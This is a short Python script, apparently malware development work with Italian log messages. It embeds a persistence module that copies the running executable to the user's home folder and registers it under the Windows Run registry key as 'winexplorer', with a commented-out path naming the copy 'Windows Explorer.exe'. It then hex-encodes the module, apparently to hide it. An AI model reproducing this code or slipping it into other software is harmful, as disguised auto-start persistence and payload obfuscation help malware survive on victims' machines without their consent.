

cd = """
import os
from os.path import expanduser
import shutil
import subprocess
import sys

home = expanduser("~")

with open(home + "/prova.txt", 'w') as f:
  f.write('Partito!')

def log (txt):
  with open('test.txt', 'a') as f:
    f.writelines([txt])

class Persistency:
  def __init__(self):
    self.finalLocation = home + "\\prova.exe" # os.environ["appdata"] + "\\Windows Explorer.exe"
  
  def checkAndCopy (self):
    if not os.path.exists(self.finalLocation):
      shutil.copyfile(sys.executable, self.finalLocation)
      subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /f /t REG_SZ /d "' + self.finalLocation + '"', shell=True)
      return True
    return False
  
  def checkAndRemove (self):
    if os.path.exists(self.finalLocation):
      subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /f', shell=True)
      os.remove(self.finalLocation)
      # shutil.copyfile(sys.executable, self.finalLocation)
      return True
    return False

try:
  print(os.environ["appdata"], sys.executable)
  p = Persistency()
  # print(p.checkAndCopy())
  if not p.checkAndCopy():
    # p.checkAndRemove()
    # log('Rimosso')
    log('Sono già attivo!')
  else:
    log('Aggiunto')
except Exception as ex:
  log(str(ex))

"""


import binascii
bytes = cd.encode()
encoded = binascii.hexlify(bytes)
print(encoded)